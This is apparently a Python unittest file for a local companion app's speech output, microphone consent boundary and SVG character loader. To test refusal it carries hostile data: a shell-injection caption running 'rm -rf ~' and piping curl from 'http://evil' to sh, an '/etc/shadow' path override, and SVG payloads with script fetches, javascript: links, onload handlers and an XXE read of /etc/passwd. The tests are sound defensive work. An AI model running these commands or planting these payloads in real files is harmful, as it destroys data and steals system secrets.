# SPDX-FileCopyrightText: 2026 ComradeArt
# SPDX-License-Identifier: GPL-3.0-or-later
"""Speaking, listening and the picture — §14, §15 and §16.

No synthesiser is invoked. Every test that would need one drives
:class:`companion.voice.SystemVoice` through an injected ``which`` so the
argument list can be inspected without a process, which is the thing that
actually matters: a caption is task-derived text, and what it becomes on its way
to a program is the whole of the question.
"""

from __future__ import annotations

import os
from pathlib import Path
import tempfile
import unittest

from companion.characters import (
    MAX_ASSET_BYTES,
    PERMITTED_SUFFIXES,
    CharacterAsset,
    CharacterError,
    candidate_paths,
    describe_phase,
    load_static_character,
)
from companion.presentation import PRESENTATION_PHASES
from companion.voice import (
    MAX_SPEECH_CHARACTERS,
    AbsentSpeechRecognition,
    MicrophoneBoundary,
    SpeechOutcome,
    SystemVoice,
    local_voice_available,
    speak_caption,
)


def _voice(name: str = "espeak-ng") -> SystemVoice:
    """A voice that believes a named binary exists, without running one."""
    return SystemVoice(which=lambda candidate: f"/usr/bin/{candidate}" if candidate == name else None)


class VoiceArgumentTests(unittest.TestCase):
    """§15: argument arrays, no shell command strings."""

    def test_the_caption_is_one_argument_and_never_concatenated(self) -> None:
        voice = _voice("espeak-ng")
        hostile = "; rm -rf ~ && curl http://evil/$(whoami) `id` | sh"
        argv = voice.argv(hostile)
        self.assertIsInstance(argv, list)
        self.assertTrue(all(isinstance(item, str) for item in argv))
        # The whole hostile string is exactly one element. Nothing split it,
        # nothing quoted it, and no shell will ever see it.
        self.assertEqual(argv[-1], hostile)
        self.assertEqual(sum(1 for item in argv if item == hostile), 1)

    def test_a_caption_beginning_with_a_hyphen_is_spoken_not_parsed(self) -> None:
        for name in ("speech-dispatcher", "espeak-ng", "say"):
            voice = _voice({"speech-dispatcher": "spd-say"}.get(name, name if name != "say" else "say"))
            if not voice.available:
                continue
            argv = voice.argv("--version")
            self.assertIn("--", argv)
            self.assertLess(argv.index("--"), argv.index("--version"))

    def test_the_rate_is_a_number_and_is_clamped(self) -> None:
        voice = _voice("espeak-ng")
        for rate in (0.01, 1.0, 99.0):
            argv = voice.argv("hello", rate=rate)
            speed = int(argv[argv.index("-s") + 1])
            self.assertGreaterEqual(speed, 80)
            self.assertLessEqual(speed, 450)

    def test_no_call_in_the_package_reaches_a_shell(self) -> None:
        """Checked against the syntax tree, not the text, across every module.

        A grep is the wrong tool twice over: several modules say ``shell=True``
        in a docstring while explaining that they never do it, and the package
        is now a dozen files where it used to be one — so a check that named a
        single path would pass while a new provider shelled out beside it.

        ``shell=False`` written explicitly is accepted and is what this package
        does. It is not noise: it states the intent at the call site and it
        survives a future where somebody changes a default.
        """
        import ast

        package = Path(__file__).resolve().parents[2] / "companion" / "voice"
        modules = sorted(package.glob("*.py"))
        self.assertGreaterEqual(len(modules), 12, "the voice package lost modules")
        for module in modules:
            tree = ast.parse(module.read_text(encoding="utf-8"), filename=str(module))
            for node in ast.walk(tree):
                if not isinstance(node, ast.Call):
                    continue
                for keyword in node.keywords:
                    if keyword.arg != "shell":
                        continue
                    self.assertIsInstance(
                        keyword.value, ast.Constant,
                        f"{module.name} passes a computed shell=",
                    )
                    self.assertIs(
                        keyword.value.value, False,
                        f"{module.name} passes shell={keyword.value.value!r}",
                    )
                target = node.func
                if isinstance(target, ast.Attribute) and isinstance(target.value, ast.Name):
                    self.assertNotIn(
                        f"{target.value.id}.{target.attr}",
                        ("os.system", "os.popen", "subprocess.getoutput", "subprocess.call"),
                        f"{module.name} reaches a shell",
                    )


class VoiceFailureTests(unittest.TestCase):
    """§15: the task continues when voice fails."""

    def test_a_machine_with_no_voice_returns_an_outcome_rather_than_raising(self) -> None:
        voice = SystemVoice(which=lambda _candidate: None)
        self.assertFalse(voice.available)
        outcome = voice.speak("speech-1", "the answer is six")
        self.assertIsInstance(outcome, SpeechOutcome)
        self.assertFalse(outcome.spoken)
        self.assertIn("caption", outcome.detail)

    def test_oversized_text_is_refused_rather_than_shortened(self) -> None:
        voice = _voice()
        outcome = voice.speak("speech-1", "x" * (MAX_SPEECH_CHARACTERS + 1))
        self.assertFalse(outcome.spoken)
        self.assertIn("not spoken", outcome.detail)
        self.assertIn("caption is unaffected", outcome.detail)

    def test_empty_text_says_nothing_and_reports_it(self) -> None:
        outcome = _voice().speak("speech-1", "   ")
        self.assertFalse(outcome.spoken)
        self.assertIn("nothing to say", outcome.detail)

    def test_speaking_a_caption_with_no_voice_configured_is_not_a_failure(self) -> None:
        outcome = speak_caption(None, "speech-1", "the answer is six")
        self.assertFalse(outcome.spoken)
        outcome = speak_caption(_voice(), "speech-1", "the answer", enabled=False)
        self.assertFalse(outcome.spoken)
        self.assertIn("turned off", outcome.detail)

    def test_cancelling_something_that_is_not_speaking_is_not_an_error(self) -> None:
        self.assertFalse(_voice().cancel("speech-unknown"))
        self.assertEqual(_voice().cancel_all(), ())

    def test_the_probe_does_not_start_anything(self) -> None:
        # `local_voice_available` is called at service start-up to decide the
        # presentation recommendation. It must look at PATH and nothing else.
        self.assertIsInstance(local_voice_available(), bool)

    def test_a_voice_never_declares_itself_remote_or_a_cloner(self) -> None:
        described = _voice().describe()
        self.assertTrue(described["local"])
        self.assertFalse(described["remoteTransmission"])
        self.assertFalse(described["voiceCloning"])
        self.assertTrue(described["captionsAuthoritative"])
        self.assertEqual(described["costClass"], "free")


class MicrophoneBoundaryTests(unittest.TestCase):
    """§16: no silent activation, and no pretence that recognition exists."""

    def setUp(self) -> None:
        self.events: list[tuple[bool, bool]] = []

    def _boundary(self, available: bool = True) -> MicrophoneBoundary:
        return MicrophoneBoundary(
            microphone_available=available, indicator=lambda on, remote: self.events.append((on, remote))
        )

    def test_constructing_the_boundary_activates_nothing(self) -> None:
        boundary = self._boundary()
        self.assertEqual(self.events, [])
        self.assertFalse(boundary.active)
        self.assertFalse(boundary.describe()["active"])
        self.assertFalse(boundary.describe()["silentActivationPossible"])

    def test_activation_without_an_explicit_interaction_is_refused(self) -> None:
        boundary = self._boundary()
        with self.assertRaises(PermissionError):
            boundary.start(AbsentSpeechRecognition(), "interaction-1", explicit_user_activation=False)
        self.assertEqual(self.events, [])
        self.assertFalse(boundary.active)

    def test_an_always_listening_mode_needs_separate_consent(self) -> None:
        boundary = self._boundary()
        with self.assertRaises(PermissionError):
            boundary.start(
                AbsentSpeechRecognition(), "interaction-1",
                explicit_user_activation=True, mode="enabled",
            )
        self.assertEqual(self.events, [])

    def test_an_unavailable_microphone_refuses_before_anything_else(self) -> None:
        boundary = self._boundary(available=False)
        with self.assertRaises(PermissionError):
            boundary.start(AbsentSpeechRecognition(), "i-1", explicit_user_activation=True)
        self.assertEqual(self.events, [])

    def test_a_remote_recogniser_without_approval_is_refused(self) -> None:
        class _Remote:
            provider_id = "somebody"
            local = False

            def transcribe(self, interaction_id: str) -> str:  # pragma: no cover - never reached
                raise AssertionError("a remote recogniser must not be reached without approval")

        boundary = self._boundary()
        with self.assertRaises(PermissionError):
            boundary.start(_Remote(), "i-1", explicit_user_activation=True)
        self.assertEqual(self.events, [])

    def test_the_indicator_is_raised_before_the_provider_and_cleared_after(self) -> None:
        boundary = self._boundary()
        boundary.start(AbsentSpeechRecognition(), "i-1", explicit_user_activation=True)
        self.assertEqual(self.events, [(True, False)])
        self.assertTrue(boundary.active)
        self.assertTrue(boundary.stop())
        self.assertEqual(self.events, [(True, False), (False, False)])
        self.assertFalse(boundary.active)

    def test_the_indicator_is_cleared_when_the_recogniser_fails(self) -> None:
        boundary = self._boundary()
        with self.assertRaises(NotImplementedError):
            boundary.transcribe(AbsentSpeechRecognition(), "i-1", explicit_user_activation=True)
        # Raised, then cleared. An indicator that only came down on success is
        # an indicator that stays lit after every fault.
        self.assertEqual(self.events, [(True, False), (False, False)])
        self.assertFalse(boundary.active)

    def test_stopping_when_nothing_is_running_still_clears_the_indicator(self) -> None:
        boundary = self._boundary()
        self.assertFalse(boundary.stop())
        self.assertEqual(self.events, [(False, False)])

    def test_two_interactions_at_once_are_refused(self) -> None:
        boundary = self._boundary()
        boundary.start(AbsentSpeechRecognition(), "i-1", explicit_user_activation=True)
        with self.assertRaises(RuntimeError):
            boundary.start(AbsentSpeechRecognition(), "i-2", explicit_user_activation=True)
        boundary.stop()

    def test_the_absent_recogniser_refuses_rather_than_returning_silence(self) -> None:
        with self.assertRaises(NotImplementedError) as caught:
            AbsentSpeechRecognition().transcribe("i-1")
        self.assertIn("no speech recogniser", str(caught.exception))
        # The distinction §16 turns on: an empty transcript would be
        # indistinguishable from having heard nothing.
        self.assertIn("empty transcript", str(caught.exception))


class StaticCharacterTests(unittest.TestCase):
    """§14: one asset, validated, with a description that stands without it."""

    def test_the_shipped_asset_loads_and_is_a_static_image(self) -> None:
        asset = load_static_character()
        self.assertIsInstance(asset, CharacterAsset)
        self.assertEqual(asset.media_type, "image/svg+xml")
        self.assertLess(asset.byte_size, MAX_ASSET_BYTES)
        self.assertEqual(asset.to_json()["renderer"], "static-image")
        self.assertFalse(asset.to_json()["animated"])
        self.assertFalse(asset.to_json()["remote"])

    def test_the_candidate_paths_are_a_closed_list(self) -> None:
        previous = os.environ.get("BUNNY_CHARACTER_PATH")
        os.environ["BUNNY_CHARACTER_PATH"] = "/etc/shadow"
        try:
            paths = [str(item) for item in candidate_paths()]
        finally:
            if previous is None:
                os.environ.pop("BUNNY_CHARACTER_PATH", None)
            else:
                os.environ["BUNNY_CHARACTER_PATH"] = previous
        self.assertEqual(len(paths), 2)
        self.assertTrue(all("default-bunny.svg" in item for item in paths))
        self.assertFalse(any("shadow" in item for item in paths))

    def test_an_svg_carrying_a_script_is_refused(self) -> None:
        directory = tempfile.TemporaryDirectory()
        self.addCleanup(directory.cleanup)
        for hostile in (
            b'<svg><script>fetch("http://evil")</script></svg>',
            b'<svg><image href="javascript:alert(1)"/></svg>',
            b'<svg onload="alert(1)"></svg>',
            b'<!DOCTYPE svg [<!ENTITY x SYSTEM "/etc/passwd">]><svg/>',
            b'<svg><foreignObject><iframe/></foreignObject></svg>',
        ):
            path = Path(directory.name) / "hostile.svg"
            path.write_bytes(hostile)
            with self.assertRaises(CharacterError, msg=hostile.decode()):
                load_static_character((path,))

    def test_a_wrong_file_type_is_refused(self) -> None:
        directory = tempfile.TemporaryDirectory()
        self.addCleanup(directory.cleanup)
        path = Path(directory.name) / "character.py"
        path.write_text("print('hello')", encoding="utf-8")
        with self.assertRaises(CharacterError):
            load_static_character((path,))
        self.assertNotIn(".py", PERMITTED_SUFFIXES)

    def test_an_oversized_asset_is_refused(self) -> None:
        directory = tempfile.TemporaryDirectory()
        self.addCleanup(directory.cleanup)
        path = Path(directory.name) / "big.png"
        path.write_bytes(b"\x00" * (MAX_ASSET_BYTES + 1))
        with self.assertRaises(CharacterError):
            load_static_character((path,))

    def test_a_symlinked_asset_is_refused_rather_than_followed(self) -> None:
        directory = tempfile.TemporaryDirectory()
        self.addCleanup(directory.cleanup)
        target = Path(directory.name) / "real.svg"
        target.write_bytes(b"<svg/>")
        link = Path(directory.name) / "link.svg"
        try:
            link.symlink_to(target)
        except (OSError, NotImplementedError):
            self.skipTest("this platform does not permit creating a symbolic link here")
        with self.assertRaises(CharacterError):
            load_static_character((link,))

    def test_a_missing_asset_is_not_an_error_because_text_only_is_a_presentation(self) -> None:
        self.assertIsNone(load_static_character((Path("/nowhere/at/all.svg"),)))

    def test_every_phase_has_a_description_that_does_not_mention_the_picture(self) -> None:
        for phase in PRESENTATION_PHASES:
            description = describe_phase(phase)
            self.assertTrue(description)
            self.assertNotIn("image", description.lower())
            self.assertNotIn("picture", description.lower())
            self.assertTrue(description.endswith("."), phase)

    def test_the_shipped_svg_declares_its_own_accessible_description(self) -> None:
        asset = load_static_character()
        source = asset.path.read_text(encoding="utf-8")
        self.assertIn('role="img"', source)
        self.assertIn("<title", source)
        self.assertIn("<desc", source)
        self.assertIn("SPDX-License-Identifier", source)
        # No external reference of any kind: no font, no image, no stylesheet,
        # no script. The SVG namespace URI is the one permitted occurrence of a
        # URL — it is an identifier, not something anything fetches — so it is
        # removed before the check rather than the check being weakened.
        without_namespace = source.replace('xmlns="http://www.w3.org/2000/svg"', "")
        for banned in ("http://", "https://", "xlink:href", "<image", "@import", "<script", "<style"):
            self.assertNotIn(banned, without_namespace)


if __name__ == "__main__":  # pragma: no cover
    unittest.main()
